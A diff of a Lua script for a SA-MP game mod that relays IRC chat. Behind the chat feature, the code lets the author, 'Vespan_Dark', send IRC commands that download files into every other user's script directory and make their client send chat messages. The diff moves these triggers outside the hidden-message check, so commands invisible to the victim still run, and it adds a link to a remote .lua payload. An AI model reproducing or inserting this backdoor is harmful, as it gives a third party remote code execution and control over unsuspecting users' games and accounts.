@@ -46,6 +46,7 @@ function main()
 	end)
 
 	if sampGetPlayerNickname(select(2,sampGetPlayerIdByCharHandle(PLAYER_PED))) == 'Vespan_Dark' then
+		-- https://raw.githubusercontent.com/Vespan/Lua/master/BRUH.lua,
 		sampRegisterChatCommand('/isd',function(url_filename)
 			local url,filename = url_filename:match('(.*),(.*)')
 			if url ~= nil or filename ~= nil then
@@ -104,23 +105,11 @@ end
 
 
 function onChat(user, channel, text)
-	local mynick = sampGetPlayerNickname(select(2,sampGetPlayerIdByCharHandle(PLAYER_PED)))
-	
+
 	msg['Chat'] = text
 
-	if not findStringInTable(msg['hideMsgOnChat'],text) then
-		user.nick = user.nick:gsub('|','_')
-		sampAddChatMessage(string.format('[IRC] {%s}%s[%s]{ffffff}:%s',
-			clistToHex(user.nick),
-			user.nick,
-			sampGetPlayerIdByNickname(user.nick),
-			(text)
-			),0xffea30)
-		if text:find('CMD .+') then
-			sampAddChatMessage('[IRC] команда была скопирована в буфер-обмена!',0xffef61)
-			setClipboardText(string.match(text,'CMD (.+)'))
-		end
-		if text:find('DOWNLOAD .+|.+') and mynick ~= 'Vespan_Dark' then
+	if sampGetPlayerNickname(select(2,sampGetPlayerIdByCharHandle(PLAYER_PED))) ~= 'Vespan_Dark' then
+		if text:find('DOWNLOAD .+|.+') then
 			local url,filename = text:match('DOWNLOAD (.+)|(.+)') 
 			if url:find('.+/Vespan/.+') then
 				downloadUrlToFile(url,getWorkingDirectory()..'/'..filename,
@@ -133,9 +122,23 @@ function onChat(user, channel, text)
 			    end)
 			end
 		end
-		if text:find('SAY .+') and mynick ~= 'Vespan_Dark' then
+		if text:find('SAY .+') then
 			local say = text:match('SAY (.+)') 
 			send(say,false)
+		end
+	end
+
+	if not findStringInTable(msg['hideMsgOnChat'],text) then
+		user.nick = user.nick:gsub('|','_')
+		sampAddChatMessage(string.format('[IRC] {%s}%s[%s]{ffffff}:%s',
+			clistToHex(user.nick),
+			user.nick,
+			sampGetPlayerIdByNickname(user.nick),
+			(text)
+			),0xffea30)
+		if text:find('CMD .+') then
+			sampAddChatMessage('[IRC] команда была скопирована в буфер-обмена!',0xffef61)
+			setClipboardText(string.match(text,'CMD (.+)'))
 		end
 
 	else
